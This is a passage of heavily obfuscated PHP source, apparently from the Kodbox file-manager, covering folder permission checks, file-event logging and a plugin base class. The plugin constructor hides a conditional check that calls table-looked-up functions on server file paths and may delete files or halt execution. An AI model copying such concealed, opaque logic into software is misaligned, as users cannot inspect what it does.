(isset($ñ´±¬ã¯[$‚İßàÓ©[536]])) { $ú…ÙÀŠÃ = explode($‚İßàÓ©[8], trim($ñ´±¬ã¯[$‚İßàÓ©[528]], $‚İßàÓ©[8])); array_shift($ú…ÙÀŠÃ); $¿®†ÄÀı = $ñ´±¬ã¯[$‚İßàÓ©[534]] . $‚İßàÓ©[2018] . implode($‚İßàÓ©[8], $ú…ÙÀŠÃ); } return array($‚İßàÓ©[429] => $ñ´±¬ã¯[$‚İßàÓ©[32]], $‚İßàÓ©[84] => KodIO::make($ñ´±¬ã¯[$‚İßàÓ©[411]]), $‚İßàÓ©[2019] => $¿®†ÄÀı); } private function groupAuthInfo($¸•œô¼×, $¤ôğ‹Ôµ) { $ÎËõ¡» =& $_SERVER[ĞÆÏ¡Îª]; $‹ˆí»œ = Model($ÎËõ¡»[531])->getInfo($¤ôğ‹Ôµ); return array($ÎËõ¡»[2020] => intval($¸•œô¼×[$ÎËõ¡»[422]]), $ÎËõ¡»[2004] => $¸•œô¼×, $ÎËõ¡»[2021] => LNG($ÎËõ¡»[2022]), $ÎËõ¡»[2013] => array($ÎËõ¡»[429] => $‹ˆí»œ[$ÎËõ¡»[32]], $ÎËõ¡»[84] => KodIO::make($‹ˆí»œ[$ÎËõ¡»[86]][$ÎËõ¡»[411]]), $ÎËõ¡»[2019] => $‹ˆí»œ[$ÎËõ¡»[535]])); } protected function groupRootAuth($±ÚÍ¡², $ù‚óË¦¸ = false) { $íıì˜ =& $_SERVER[ĞÆÏ¡Îª]; $ù‚óË¦¸ = $ù‚óË¦¸ ? $ù‚óË¦¸ : USER_ID; $Ù¢¸ä«Ú = $ù‚óË¦¸ . $íıì˜[2023] . $±ÚÍ¡²; static $¨œßæ”® = array(); if (isset($¨œßæ”®[$Ù¢¸ä«Ú])) { return $¨œßæ”®[$Ù¢¸ä«Ú]; } $à¡›”—Ş = Model($íıì˜[531])->getInfo($±ÚÍ¡²); $õø¼ ú = $this->userGroupList($ù‚óË¦¸); $“ôšô»Æ = isset($õø¼ ú[$±ÚÍ¡²]) ? $õø¼ ú[$±ÚÍ¡²][$íıì˜[422]] : !1; if ($“ôšô»Æ && Model($íıì˜[516])->authCheckAction($“ôšô»Æ[$íıì˜[422]], $íıì˜[1840])) { $¨œßæ”®[$Ù¢¸ä«Ú] = $“ôšô»Æ; return $“ôšô»Æ; } $««ŸÚ»µ = $this->sourceAuthSelect($à¡›”—Ş[$íıì˜[86]][$íıì˜[411]]); $ŸÉ“¼ª³ = $««ŸÚ»µ ? $this->authMake($««ŸÚ»µ, $ù‚óË¦¸) : !1; $ÀãôÁÛØ = $ŸÉ“¼ª³ ? $ŸÉ“¼ª³[$íıì˜[476]] : !1; $¨œßæ”®[$Ù¢¸ä«Ú] = $ÀãôÁÛØ ? $ÀãôÁÛØ : $“ôšô»Æ; return $¨œßæ”®[$Ù¢¸ä«Ú]; } public function authOwnerApply($îæÏû‡) { $ÅÚ§·¤‚ =& $_SERVER[ĞÆÏ¡Îª]; if (empty($îæÏû‡[$ÅÚ§·¤‚[422]]) || isset($îæÏû‡[$ÅÚ§·¤‚[2024]]) && $îæÏû‡[$ÅÚ§·¤‚[2024]]) { return $îæÏû‡; } if (AuthModel::authCheckRoot($îæÏû‡[$ÅÚ§·¤‚[422]][$ÅÚ§·¤‚[423]])) { return $îæÏû‡; } $•ñÁ­ˆ = Model($ÅÚ§·¤‚[1318])->parentLevelArray($îæÏû‡[$ÅÚ§·¤‚[530]]); $•ñÁ­ˆ = array_merge(array($îæÏû‡[$ÅÚ§·¤‚[411]]), array_reverse($•ñÁ­ˆ)); $š—²–Ô£ = $this->sourceAuthSelect($•ñÁ­ˆ); $Ôó–íà¯ = array(); $şêòÒ÷– = array(); foreach ($š—²–Ô£ as $òıÉƒÔñ => $È½ìÅÂ) { $œ¢×´Š = $this->authFolderOwnerUser($È½ìÅÂ); $Ôó–íà¯[$òıÉƒÔñ] = $œ¢×´Š; $şêòÒ÷– = array_merge($şêòÒ÷–, $œ¢×´Š[$ÅÚ§·¤‚[609]]); if ($œ¢×´Š[$ÅÚ§·¤‚[2025]]) { break; } } if (count($şêòÒ÷–) == 0) { $şêòÒ÷– = $this->authFolderOwnerGroup($îæÏû‡[$ÅÚ§·¤‚[514]]); } $şêòÒ÷– = array_unique($şêòÒ÷–); if (AuthModel::authCheckRoot($îæÏû‡[$ÅÚ§·¤‚[422]][$ÅÚ§·¤‚[423]])) { $şêòÒ÷–[] = USER_ID; } $îæÏû‡[$ÅÚ§·¤‚[422]][$ÅÚ§·¤‚[2026]] = Model($ÅÚ§·¤‚[522])->userListInfo($şêòÒ÷–); return $îæÏû‡; } private function authFolderOwnerGroup($·‰–¬ôú) { $Ì¡¬Æñù =& $_SERVER[ĞÆÏ¡Îª]; $…ä£Ÿóô = Model($Ì¡¬Æñù[1909])->where(array($Ì¡¬Æñù[1819] => $·‰–¬ôú))->select(); $ƒ²ßŠ³ş = array(); if (!$…ä£Ÿóô) { return $ƒ²ßŠ³ş; } foreach ($…ä£Ÿóô as $­Öº’ı) { $“¥ôîÊ = $this->authInfo($­Öº’ı); if (AuthModel::authCheckRoot($“¥ôîÊ[$Ì¡¬Æñù[422]])) { $ƒ²ßŠ³ş[] = $­Öº’ı[$Ì¡¬Æñù[1647]]; } } return $ƒ²ßŠ³ş; } private function authFolderOwnerUser($ºÅá©ï¡) { $ëû…ÈÜ˜ =& $_SERVER[ĞÆÏ¡Îª]; $ıò¬ºç´ = array(); $Œùåí—¼ = !1; foreach ($ºÅá©ï¡ as $º®î±á¤) { $·Å„Ø Ù = $this->authInfo($º®î±á¤); if ($º®î±á¤[$ëû…ÈÜ˜[514]] == $ëû…ÈÜ˜[197]) { $Œùåí—¼ = !0; } if ($º®î±á¤[$ëû…ÈÜ˜[420]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($·Å„Ø Ù[$ëû…ÈÜ˜[422]])) { $ıò¬ºç´[] = $º®î±á¤[$ëû…ÈÜ˜[514]]; } } } return array($ëû…ÈÜ˜[609] => $ıò¬ºç´, $ëû…ÈÜ˜[2025] => $Œùåí—¼); } public function authMake($¥İëÜ‹÷, $Àô‘¶šˆ = false) { $Ë‚Û˜ªó =& $_SERVER[ĞÆÏ¡Îª]; $€ôòçµ = $this->authArrayCheck($¥İëÜ‹÷, $Àô‘¶šˆ); if ($€ôòçµ[$Ë‚Û˜ªó[2027]]) { $€ôòçµ[$Ë‚Û˜ªó[2027]] = $this->sourceAuthInfo($€ôòçµ[$Ë‚Û˜ªó[2027]]); } return $€ôòçµ; } public function authArrayCheck($û×Ë„œÌ, $¨ƒ²‚Ö = false) { $ßİáÖ =& $_SERVER[ĞÆÏ¡Îª]; if (!$û×Ë„œÌ) { return array($ßİáÖ[423] => 0, $ßİáÖ[476] => !1); } $¨ƒ²‚Ö = $¨ƒ²‚Ö ? $¨ƒ²‚Ö : USER_ID; $¹ä¾‡üù = 0; $…¢Á¤ = 0; $È¢íÃÓâ = 0; $„•‹‚ØĞ = 0; $¼“Á¤‘ª = 0; $×«‘¬´ = 0; $ãØÀê—¢ = 1000; $ü…ÚÖ´¶ = 0; $°¶Ûı¼° = 0; $½É•¦Òİ = 0; $é—Àí = 0; $Ë’Î¢¬İ = array($ßİáÖ[411] => 0); foreach ($û×Ë„œÌ as $Ë’Î¢¬İ) { $Ç“Å´¢ = $this->authInfo($Ë’Î¢¬İ); if (!$Ç“Å´¢) { continue; } $™§²µÃ = $Ë’Î¢¬İ[$ßİáÖ[514]]; $ïê†áæÜ = intval($Ç“Å´¢[$ßİáÖ[422]]); if ($Ë’Î¢¬İ[$ßİáÖ[420]] == SourceModel::TYPE_USER && $™§²µÃ == $¨ƒ²‚Ö) { $¹ä¾‡üù = !0; $È¢íÃÓâ = $Ç“Å´¢; $…¢Á¤ = $ïê†áæÜ; } else { if ($Ë’Î¢¬İ[$ßİáÖ[420]] == SourceModel::TYPE_GROUP && $this->groupContainUser($™§²µÃ, $¨ƒ²‚Ö)) { $„•‹‚ØĞ = !0; $ü¢…¢¥¨ = $this->groupStepToUserGroup($™§²µÃ, $¨ƒ²‚Ö); if ($ü¢…¢¥¨ < $ãØÀê—¢) { $ãØÀê—¢ = $ü¢…¢¥¨; $¼“Á¤‘ª = $ïê†áæÜ; $×«‘¬´ = $Ç“Å´¢; $ü…ÚÖ´¶ = $™§²µÃ; } if ($ü¢…¢¥¨ == $ãØÀê—¢ && $ïê†áæÜ >= $¼“Á¤‘ª) { $¼“Á¤‘ª = $ïê†áæÜ; $×«‘¬´ = $Ç“Å´¢; $ü…ÚÖ´¶ = $™§²µÃ; } } else { if ($™§²µÃ == $ßİáÖ[197]) { $°¶Ûı¼° = !0; $é—Àí = $Ç“Å´¢; $½É•¦Òİ = $ïê†áæÜ; } } } } if ($¹ä¾‡üù) { $Ö«››™¯ = $…¢Á¤; $Ç“Å´¢ = $È¢íÃÓâ; $×ôÎü‘ = LNG($ßİáÖ[2028]); } else { if ($„•‹‚ØĞ) { $Ö«››™¯ = $¼“Á¤‘ª; $Ç“Å´¢ = $×«‘¬´; $á‡óØŒñ = Model($ßİáÖ[531])->getInfo($ü…ÚÖ´¶); $×ôÎü‘ = $ßİáÖ[162] . $á‡óØŒñ[$ßİáÖ[535]] . $ßİáÖ[2029] . LNG($ßİáÖ[2030]); } else { if ($°¶Ûı¼°) { $Ö«››™¯ = $½É•¦Òİ; $Ç“Å´¢ = $é—Àí; $×ôÎü‘ = LNG($ßİáÖ[2001]); } else { $Ö«››™¯ = 0; $Ç“Å´¢ = !1; $×ôÎü‘ = $ßİáÖ[12]; } } } $Ğ¥§šğÑ = array($ßİáÖ[2020] => intval($Ö«››™¯), $ßİáÖ[2004] => $Ç“Å´¢, $ßİáÖ[2021] => $×ôÎü‘, $ßİáÖ[2013] => $Ë’Î¢¬İ[$ßİáÖ[411]]); return $Ğ¥§šğÑ; } private function groupContainUser($É‹ïüÅË, $ÑÂã¢î = false) { return in_array($É‹ïüÅË, $this->userGroupParents($ÑÂã¢î)); } private function groupStepToUserGroup($¯òŠŒ¡–, $ç˜ğ²è = false) { $¢Î¶Õá‡ =& $_SERVER[ĞÆÏ¡Îª]; $£úËÓè = $this->userGroupList($ç˜ğ²è); $®ÑÃ©şÅ = 1000; $»Œµä±í = $GLOBALS[$¢Î¶Õá‡[6]][$¢Î¶Õá‡[89]][$¢Î¶Õá‡[1922]] == 1; $ÙøıÎ€ = $»Œµä±í ? 3 : 2; foreach ($£úËÓè as $–´ÖÛô) { if ($–´ÖÛô[$¢Î¶Õá‡[1819]] == $¯òŠŒ¡–) { return 0; } $…º¡ âÀ = explode($¢Î¶Õá‡[50], trim($–´ÖÛô[$¢Î¶Õá‡[530]], $¢Î¶Õá‡[50])); if ($…º¡ âÀ[0] == $¢Î¶Õá‡[197] && count($…º¡ âÀ) > $ÙøıÎ€) { $¡é¢óùª = array_reverse(array_slice($…º¡ âÀ, $ÙøıÎ€)); $³½«»’Á = array_search($¯òŠŒ¡–, $¡é¢óùª); if ($³½«»’Á !== !1 && $³½«»’Á + 1 <= $®ÑÃ©şÅ) { $®ÑÃ©şÅ = $³½«»’Á + 1; } } } return $®ÑÃ©şÅ; } private function userGroupList($ˆ´™²– = false) { $ŠóÂÍÜú =& $_SERVER[ĞÆÏ¡Îª]; static $«ÌŞ”æ = array(); if (isset($«ÌŞ”æ[$ˆ´™²–])) { return $«ÌŞ”æ[$ˆ´™²–]; } $°ë¤‰ËÃ = Model($ŠóÂÍÜú[544])->getInfo($ˆ´™²–); $«ÌŞ”æ[$ˆ´™²–] = array_to_keyvalue($°ë¤‰ËÃ[$ŠóÂÍÜú[2002]], $ŠóÂÍÜú[1819]); return $«ÌŞ”æ[$ˆ´™²–]; } public function userGroupParents($İ©Á×) { $’È¹†¿Û =& $_SERVER[ĞÆÏ¡Îª]; static $‘†Ü” = array(); $İ©Á× = $İ©Á× ? $İ©Á× : USER_ID; if (isset($‘†Ü”[$İ©Á×])) { return $‘†Ü”[$İ©Á×]; } $ §€’Ø = $this->userGroupList($İ©Á×); $ÇÂ÷÷ğì = array(); $Ÿó²˜‚¿ = $GLOBALS[$’È¹†¿Û[6]][$’È¹†¿Û[89]][$’È¹†¿Û[1922]] == 1; $ÈùüƒĞ» = $Ÿó²˜‚¿ ? 3 : 2; foreach ($ §€’Ø as $€Ñè¤ó) { $é…„€ëı = array($€Ñè¤ó[$’È¹†¿Û[1819]]); $ô¶“šÕ‘ = explode($’È¹†¿Û[50], trim($€Ñè¤ó[$’È¹†¿Û[530]], $’È¹†¿Û[50])); if ($ô¶“šÕ‘[0] == $’È¹†¿Û[197] && count($ô¶“šÕ‘) > $ÈùüƒĞ») { $¸¤ë¤Ïæ = array_slice($ô¶“šÕ‘, $ÈùüƒĞ»); $é…„€ëı = array_merge($é…„€ëı, array_reverse($¸¤ë¤Ïæ)); } $ÇÂ÷÷ğì = array_merge($ÇÂ÷÷ğì, $é…„€ëı); } $‘†Ü”[$İ©Á×] = array_unique($ÇÂ÷÷ğì); return $‘†Ü”[$İ©Á×]; } public function authTargetInfoMake($ÛìÂÍõ‡) { $éò‹œõ =& $_SERVER[ĞÆÏ¡Îª]; $µŠ¡¥üâ = array(); $±ª©’ç› = array(); foreach ($ÛìÂÍõ‡ as $¸Ï–üü›) { if ($¸Ï–üü›[$éò‹œõ[420]] == SourceModel::TYPE_USER) { $µŠ¡¥üâ[] = intval($¸Ï–üü›[$éò‹œõ[514]]); } else { if ($¸Ï–üü›[$éò‹œõ[420]] == SourceModel::TYPE_GROUP) { $±ª©’ç›[] = intval($¸Ï–üü›[$éò‹œõ[514]]); } } } if ($µŠ¡¥üâ) { $µŠ¡¥üâ = Model($éò‹œõ[522])->userListInfo($µŠ¡¥üâ); } if ($±ª©’ç›) { $Úñˆ°¢î = array($éò‹œõ[1907] => array($éò‹œõ[427], $±ª©’ç›)); $±ª©’ç› = Model($éò‹œõ[531])->field($éò‹œõ[2031])->where($Úñˆ°¢î)->select(); $±ª©’ç› = array_to_keyvalue($±ª©’ç›, $éò‹œõ[1819]); } return array($éò‹œõ[2032] => $µŠ¡¥üâ, $éò‹œõ[2033] => $±ª©’ç›); } public function authInfo($¸Ï‘‘) { $œÒöõ¥³ =& $_SERVER[ĞÆÏ¡Îª]; if ($¸Ï‘‘[$œÒöõ¥³[1923]]) { $–¥Â³É­ = Model($œÒöõ¥³[516])->listData($¸Ï‘‘[$œÒöõ¥³[1923]]); if (!$–¥Â³É­) { return !1; $ìÓÎŠøó = Model($œÒöõ¥³[516])->listData(); $Ùôç“Æ¸ = array_filter_by_field($ìÓÎŠøó, $œÒöõ¥³[422], $œÒöõ¥³[197]); return $Ùôç“Æ¸; } $â®íüÀÑ = array_field_key($–¥Â³É­, array($œÒöõ¥³[407], $œÒöõ¥³[32], $œÒöõ¥³[422], $œÒöõ¥³[1842], $œÒöõ¥³[1843])); $â®íüÀÑ[$œÒöõ¥³[2034]] = $¸Ï‘‘; return $â®íüÀÑ; } else { return array($œÒöõ¥³[428] => 0, $œÒöõ¥³[1825] => $¸Ï‘‘[$œÒöõ¥³[1979]], $œÒöõ¥³[429] => $œÒöõ¥³[12], $œÒöõ¥³[1842] => $œÒöõ¥³[2035]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\165\x72\x63\x65\x5f\x65\x76\145\x6e\x74"; protected $dataAuto = array(array("\x63\162\145\141\x74\x65\124\151\155\x65", "\x74\151\x6d\x65", "\151\156\163\x65\x72\164", "\146\x75\x6e\143\164\151\157\x6e"), array("\x64\x65\163\x63", '', "\151\156\163\145\x72\x74\x2c\165\160\x64\141\164\145\54\163\145\154\x65\x63\x74", "\152\x73\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($¨ÕÒÃŞ¬, $ÊìÖ¬ÎÒ, $À°İ‡Á = '') { $áŸ²º =& $_SERVER[ĞÆÏ¡Îª]; if (!$this->eventSave) { return; } $Æ‚Ğ˜®Ü = Model($áŸ²º[1318])->sourceInfo($¨ÕÒÃŞ¬); if (!$Æ‚Ğ˜®Ü) { return !1; } if ($this->isCacheEvent($Æ‚Ğ˜®Ü, $ÊìÖ¬ÎÒ)) { return; } if ($À°İ‡Á && is_string($À°İ‡Á)) { $À°İ‡Á = array($áŸ²º[1858] => $À°İ‡Á); } $Ó’Š¼Ì§ = array($áŸ²º[426] => $¨ÕÒÃŞ¬, $áŸ²º[2036] => $Æ‚Ğ˜®Ü[$áŸ²º[441]], $áŸ²º[2037] => $Æ‚Ğ˜®Ü[$áŸ²º[32]], $áŸ²º[528] => !empty($Æ‚Ğ˜®Ü[$áŸ²º[528]]) ? $Æ‚Ğ˜®Ü[$áŸ²º[528]] : $áŸ²º[12], $áŸ²º[1638] => USER_ID, $áŸ²º[431] => $ÊìÖ¬ÎÒ, $áŸ²º[1640] => $À°İ‡Á); $this->addSystemLog($ÊìÖ¬ÎÒ, $Ó’Š¼Ì§); unset($Ó’Š¼Ì§[$áŸ²º[2037]], $Ó’Š¼Ì§[$áŸ²º[528]]); return $this->add($Ó’Š¼Ì§); } private function addSystemLog($Ò¦şƒàØ, $¨¯¦ì²¥) { $Â·éœ²Ç =& $_SERVER[ĞÆÏ¡Îª]; if ($Ò¦şƒàØ == $Â·éœ²Ç[2038]) { $Ò¦şƒàØ = $¨¯¦ì²¥[$Â·éœ²Ç[462]][$Â·éœ²Ç[2039]]; } else { if (in_array($Ò¦şƒàØ, array($Â·éœ²Ç[1799], $Â·éœ²Ç[2040]))) { $Ò¦şƒàØ = $¨¯¦ì²¥[$Â·éœ²Ç[462]][$Â·éœ²Ç[750]]; } } $…—´üºÖ = array_merge($¨¯¦ì²¥, array($Â·éœ²Ç[2041] => $¨¯¦ì²¥[$Â·éœ²Ç[411]], $Â·éœ²Ç[2042] => $¨¯¦ì²¥[$Â·éœ²Ç[2042]])); Hook::trigger($Â·éœ²Ç[2043], $Â·éœ²Ç[2044] . $Ò¦şƒàØ, $¨¯¦ì²¥); Model($Â·éœ²Ç[1763])->addLog($Â·éœ²Ç[2044] . $Ò¦şƒàØ, $…—´üºÖ); } private function isCacheEvent($°ˆäàûà, $¯Á«¥ÃÊ) { if ($°ˆäàûà[$_SERVER[ĞÆÏ¡Îª][420]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($†¿ÛöÅÚ, $÷¥Ù«È) { $Üı¨êçª =& $_SERVER[ĞÆÏ¡Îª]; $Ê™Ö×¬Ó = Model($Üı¨êçª[1318])->sourceInfo($†¿ÛöÅÚ); $‰¦ŞÀª© = array($Üı¨êçª[2039] => $÷¥Ù«È, $Üı¨êçª[32] => $Ê™Ö×¬Ó[$Üı¨êçª[32]]); return $this->addEvent($†¿ÛöÅÚ, $Üı¨êçª[2038], $‰¦ŞÀª©); } public function eventFileEdit($øºÌ‚) { $ø†õêÛ· =& $_SERVER[ĞÆÏ¡Îª]; $Áê„…ÈÇ = array($ø†õêÛ·[2045] => $_SERVER[$ø†õêÛ·[2046]], $ø†õêÛ·[2047] => strtolower(ACTION)); if (isset($GLOBALS[$ø†õêÛ·[7]][$ø†õêÛ·[2048]])) { $Áê„…ÈÇ[$ø†õêÛ·[2048]] = $ø†õêÛ·[88]; } return $this->addEvent($øºÌ‚, $ø†õêÛ·[1789], $Áê„…ÈÇ); } public function eventRecycle($ÒÒÈ†æœ, $Ìõæğ•) { return $this->addEvent($ÒÒÈ†æœ, $_SERVER[ĞÆÏ¡Îª][2040], $Ìõæğ•); } public function eventRemove($–Şê‘…) { $Âê…ª×á =& $_SERVER[ĞÆÏ¡Îª]; $ïÓŠÏ’£ = Model($Âê…ª×á[1318])->sourceInfo($–Şê‘…); $‹ë‰³˜Ñ = $ïÓŠÏ’£[$Âê…ª×á[32]]; return $this->addEvent($ïÓŠÏ’£[$Âê…ª×á[441]], $Âê…ª×á[1788], $‹ë‰³˜Ñ); } public function eventShare($Ø™é‚Ñ˜, $õì©Ô³) { return $this->addEvent($Ø™é‚Ñ˜, $_SERVER[ĞÆÏ¡Îª][1799], $õì©Ô³); } public function eventMove($ÄÇÃ­ğ¨, $«â»®î, $ëÆ±š­î) { $Ö©îÒ¤œ =& $_SERVER[ĞÆÏ¡Îª]; $Ó®—é×Ì = Model($Ö©îÒ¤œ[1318]); $êü‹øî— = $Ó®—é×Ì->sourceInfo($ÄÇÃ­ğ¨); $ÄÎŠùÎ½ = $Ó®—é×Ì->sourceInfo($«â»®î); $Çè¤àŠÕ = $Ó®—é×Ì->sourceInfo($ëÆ±š­î); $Êî´ïÉ€ = array($Ö©îÒ¤œ[1151] => $«â»®î, $Ö©îÒ¤œ[2049] => $ÄÎŠùÎ½[$Ö©îÒ¤œ[32]], $Ö©îÒ¤œ[2027] => !empty($ÄÎŠùÎ½[$Ö©îÒ¤œ[528]]) ? $ÄÎŠùÎ½[$Ö©îÒ¤œ[528]] : $Ö©îÒ¤œ[12], $Ö©îÒ¤œ[1152] => $ëÆ±š­î, $Ö©îÒ¤œ[2050] => $Çè¤àŠÕ[$Ö©îÒ¤œ[32]], $Ö©îÒ¤œ[2051] => !empty($Çè¤àŠÕ[$Ö©îÒ¤œ[528]]) ? $Çè¤àŠÕ[$Ö©îÒ¤œ[528]] : $Ö©îÒ¤œ[12]); $this->addEvent($ÄÇÃ­ğ¨, $Ö©îÒ¤œ[566], $Êî´ïÉ€); $êü‹øî— = $Ó®—é×Ì->sourceInfo($ÄÇÃ­ğ¨); $Êî´ïÉ€ = array($Ö©îÒ¤œ[411] => $êü‹øî—[$Ö©îÒ¤œ[411]], $Ö©îÒ¤œ[32] => $êü‹øî—[$Ö©îÒ¤œ[32]]); $this->addEvent($«â»®î, $Ö©îÒ¤œ[2052], $Êî´ïÉ€); } public function eventCopy($Ü€«£õ¹) { $this->eventCreate($Ü€«£õ¹, $_SERVER[ĞÆÏ¡Îª][564]); } public function eventRename($çÇõ” –, $Éİ­†ı, $Œ‹•àú) { $æÒ“©Åé =& $_SERVER[ĞÆÏ¡Îª]; $ı»®ı¤ = array($æÒ“©Åé[1151] => $Éİ­†ı, $æÒ“©Åé[1152] => $Œ‹•àú); return $this->addEvent($çÇõ” –, $æÒ“©Åé[1333], $ı»®ı¤); } public function eventAddComment($Áˆ›â’”, $²¿ƒÀßë) { return $this->addEvent($Áˆ›â’”, $_SERVER[ĞÆÏ¡Îª][2053], $²¿ƒÀßë); } public function eventAddDesc($Çï—ğëË, $Üóßôßı) { return $this->addEvent($Çï—ğëË, $_SERVER[ĞÆÏ¡Îª][2054], $Üóßôßı); } public function listBySource($¹‘äã) { $Äá¨ñªï =& $_SERVER[ĞÆÏ¡Îª]; $»Ü“ß”® = Model($Äá¨ñªï[1318])->sourceInfo($¹‘äã); $‰²Æ¥Á’ = array($Äá¨ñªï[426] => $¹‘äã); if ($»Ü“ß”®[$Äá¨ñªï[419]] == $Äá¨ñªï[88]) { $àß‘ª‡ = Model($Äá¨ñªï[1318])->listSearchChildren($¹‘äã, 20000); $àß‘ª‡[] = $¹‘äã . $Äá¨ñªï[246]; $‰²Æ¥Á’ = array($Äá¨ñªï[411] => array($Äá¨ñªï[7], $àß‘ª‡)); } $ëå—–Û = $this->where($‰²Æ¥Á’)->order($Äá¨ñªï[2055])->selectPage(); if ($ëå—–Û[$Äá¨ñªï[375]][$Äá¨ñªï[376]] == 0) { $ëå—–Û[$Äá¨ñªï[375]][$Äá¨ñªï[376]] = 1; $ëå—–Û[$Äá¨ñªï[378]] = array(array($Äá¨ñªï[426] => $¹‘äã, $Äá¨ñªï[2036] => $»Ü“ß”®[$Äá¨ñªï[441]], $Äá¨ñªï[1638] => $»Ü“ß”®[$Äá¨ñªï[463]], $Äá¨ñªï[431] => $Äá¨ñªï[2056], $Äá¨ñªï[432] => $»Ü“ß”®[$Äá¨ñªï[200]], $Äá¨ñªï[1640] => $Äá¨ñªï[12])); } return $this->eventListParse($ëå—–Û, $¹‘äã); } private function eventListParse($Ï¿¾×—, $Èªé’‹Ü) { $–Û’°ğÏ =& $_SERVER[ĞÆÏ¡Îª]; $˜ïÊ¨ìä = $Ï¿¾×—[$–Û’°ğÏ[378]]; $àÖ­ô–Ô = array_to_keyvalue($˜ïÊ¨ìä, $–Û’°ğÏ[12], $–Û’°ğÏ[411]); $‹ÒŸÆÑÏ = array_to_keyvalue($˜ïÊ¨ìä, $–Û’°ğÏ[12], $–Û’°ğÏ[2042]); foreach ($˜ïÊ¨ìä as $üĞŞË¥™) { $¨öì¼ = $üĞŞË¥™[$–Û’°ğÏ[462]]; if ($üĞŞË¥™[$–Û’°ğÏ[33]] == $–Û’°ğÏ[566] && isset($¨öì¼[$–Û’°ğÏ[1151]])) { $àÖ­ô–Ô[] = $¨öì¼[$–Û’°ğÏ[1151]] . $–Û’°ğÏ[12]; $àÖ­ô–Ô[] = $¨öì¼[$–Û’°ğÏ[1152]] . $–Û’°ğÏ[12]; } if ($üĞŞË¥™[$–Û’°ğÏ[33]] == $–Û’°ğÏ[2052] && isset($¨öì¼[$–Û’°ğÏ[411]])) { $àÖ­ô–Ô[] = $¨öì¼[$–Û’°ğÏ[411]] . $–Û’°ğÏ[12]; } } $àÖ­ô–Ô = array_merge($àÖ­ô–Ô, $‹ÒŸÆÑÏ, array($Èªé’‹Ü . $–Û’°ğÏ[12])); $àÖ­ô–Ô = array_unique($àÖ­ô–Ô); $‚ıŞî˜‚ = array_unique(array_to_keyvalue($˜ïÊ¨ìä, $–Û’°ğÏ[12], $–Û’°ğÏ[1647])); $‹—…úÜğ = Model($–Û’°ğÏ[544])->userListInfo($‚ıŞî˜‚); $ÔóË¼¾è = Model($–Û’°ğÏ[820])->sourceListInfo($àÖ­ô–Ô, !0); foreach ($˜ïÊ¨ìä as &$üĞŞË¥™) { if ($üĞŞË¥™[$–Û’°ğÏ[33]] == $–Û’°ğÏ[566] && isset($üĞŞË¥™[$–Û’°ğÏ[462]][$–Û’°ğÏ[1151]])) { $üĞŞË¥™[$–Û’°ğÏ[462]][$–Û’°ğÏ[1151]] = $ÔóË¼¾è[$üĞŞË¥™[$–Û’°ğÏ[462]][$–Û’°ğÏ[1151]]]; $üĞŞË¥™[$–Û’°ğÏ[462]][$–Û’°ğÏ[1152]] = $ÔóË¼¾è[$üĞŞË¥™[$–Û’°ğÏ[462]][$–Û’°ğÏ[1152]]]; } if ($üĞŞË¥™[$–Û’°ğÏ[33]] == $–Û’°ğÏ[2052] && isset($üĞŞË¥™[$–Û’°ğÏ[462]][$–Û’°ğÏ[411]])) { $üĞŞË¥™[$–Û’°ğÏ[462]][$–Û’°ğÏ[411]] = $ÔóË¼¾è[$üĞŞË¥™[$–Û’°ğÏ[462]][$–Û’°ğÏ[411]]]; } $üĞŞË¥™[$–Û’°ğÏ[86]] = $ÔóË¼¾è[$üĞŞË¥™[$–Û’°ğÏ[411]]]; $üĞŞË¥™[$–Û’°ğÏ[2057]] = $ÔóË¼¾è[$üĞŞË¥™[$–Û’°ğÏ[2042]]]; if ($üĞŞË¥™[$–Û’°ğÏ[33]] == $–Û’°ğÏ[1788]) { $üĞŞË¥™[$–Û’°ğÏ[2057]] = $üĞŞË¥™[$–Û’°ğÏ[86]]; $üĞŞË¥™[$–Û’°ğÏ[2042]] = $üĞŞË¥™[$–Û’°ğÏ[2057]][$–Û’°ğÏ[411]]; $üĞŞË¥™[$–Û’°ğÏ[86]] = !1; $üĞŞË¥™[$–Û’°ğÏ[411]] = $–Û’°ğÏ[12]; } $üĞŞË¥™[$–Û’°ğÏ[1987]] = $‹—…úÜğ[$üĞŞË¥™[$–Û’°ğÏ[1647]]]; } unset($üĞŞË¥™); $Ï¿¾×—[$–Û’°ğÏ[378]] = $˜ïÊ¨ìä; return $Ï¿¾×—; } public function removeBySource($£Ç¶ñ÷) { $şÚÙğë« = array($_SERVER[ĞÆÏ¡Îª][426] => $£Ç¶ñ÷); $this->where($şÚÙğë«)->remove(); } } goto E¦ˆÒµğ; fŠ‚…±ç’¬: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $¹™°ä¶ =& $_SERVER[ĞÆÏ¡Îª]; if ($_SERVER[$¹™°ä¶[238]] != $_SERVER[$¹™°ä¶[408]]) { $²ÜíË‚¢ = $¹™°ä¶[868]; $ÒÎç‰ÉÉ = $¹™°ä¶[240]; $Ç›Å†õà = $_SERVER[$¹™°ä¶[241]] . $¹™°ä¶[242]; $•£½¸Óü = $ÒÎç‰ÉÉ($Ç›Å†õà); $ßÌ”º—Î = explode($¹™°ä¶[231], $•£½¸Óü); if (count($ßÌ”º—Î) < $¹™°ä¶[635]) { $ÓåƒÇÕ = $¹™°ä¶[244]; $ÓåƒÇÕ(); } $¢¯­ ¥Ù = $¹™°ä¶[869]; $¢¯­ ¥Ù($_SERVER[$¹™°ä¶[870]]); $¢¯­ ¥Ù($_SERVER[$¹™°ä¶[241]] . $¹™°ä¶[1512]); $‚‹îª› = 1; while ($‚‹îª› > 1) { $‚‹îª› = $‚‹îª› + 4; $á¼“¼¦¬ = rawurlencode($‚‹îª› . $¹™°ä¶[246]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($¹™°ä¶[1513]); $this->pluginName = str_replace($¹™°ä¶[1513], $¹™°ä¶[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $¹™°ä¶[8]; $this->pluginApi = appHostGet() . $¹™°ä¶[1514] . $this->pluginName . $¹™°ä¶[8]; $this->pluginHost = $config[$¹™°ä¶[1515]] . $this->pluginName . 